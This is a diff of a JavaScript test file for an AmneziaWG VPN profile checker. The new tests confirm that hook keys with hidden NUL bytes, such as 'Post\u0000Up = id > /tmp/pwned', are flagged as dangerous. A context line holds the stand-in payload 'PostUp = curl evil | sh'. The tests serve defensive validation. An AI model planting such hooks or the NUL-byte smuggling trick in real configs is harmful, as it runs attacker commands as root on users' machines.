@@ -68,6 +68,29 @@ test("hasDangerousHooks follows awg-quick on case, comments and near-misses", ()
   eq(AmneziaWg.hasDangerousHooks("[Interface]\nSaveConfig PostUp = curl evil | sh"), false)
 })
 
+// awg-quick hands each line to its parser through bash's `read`, which drops
+// NUL bytes without a word: `Post<NUL>Up` arrives as `PostUp` and runs as root.
+test("hasDangerousHooks sees a hook whose key has NUL bytes inside it", () => {
+  eq(AmneziaWg.hasDangerousHooks("[Interface]\nPost\u0000Up = id > /tmp/pwned"), true)
+  eq(AmneziaWg.hasDangerousHooks("[Interface]\n\u0000PreDown\u0000 = id > /tmp/pwned"), true)
+})
+
+// listProcess's output for such a profile, from before the listing deleted the
+// byte, with `\u0000` standing in for it. The check read a key named
+// "post\0up", found no hook, and the profile connected.
+test("parseProfileBundle blocks a profile whose hook key hides a NUL byte", () => {
+  const bundle = [
+    "#awg-profile /tmp/awgtest/profiles/nul.conf",
+    "\t[Interface]",
+    "\tPrivateKey = [redacted]",
+    "\tPost\u0000Up = id > /tmp/pwned",
+    "\t[Peer]",
+    "\tEndpoint = 1.2.3.4:51820",
+    "\tAllowedIPs = 0.0.0.0/0"
+  ].join("\n")
+  eq(AmneziaWg.parseProfileBundle(bundle)[0].hasHooks, true)
+})
+
 test("parseConf reads endpoints and the default route off the config", () => {
   const conf = AmneziaWg.parseConf("[Peer]\nEndpoint = 203.0.113.9:51820\nAllowedIPs = 0.0.0.0/0, ::/0")
   eq(conf, { hasHooks: false, endpoints: ["203.0.113.9:51820"], defaultRoute: true })
